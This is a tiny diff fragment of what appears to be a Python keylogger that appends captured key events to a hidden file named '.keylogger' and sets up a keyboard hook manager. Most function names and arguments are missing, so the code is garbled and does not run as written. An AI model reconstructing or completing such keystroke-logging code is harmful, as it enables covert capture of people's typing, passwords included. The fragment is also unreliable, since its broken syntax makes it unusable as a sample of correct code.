@@ -1,0 +1,12 @@
+	file = ('.keylogger', 'a')
+('\n')
+()
+	    with ('.keylogger', 'a+') as File:
+	    (event.Key)
+        ()
+        ()
+	hookman = ()
+()
+()
+	    (0.1)
+()
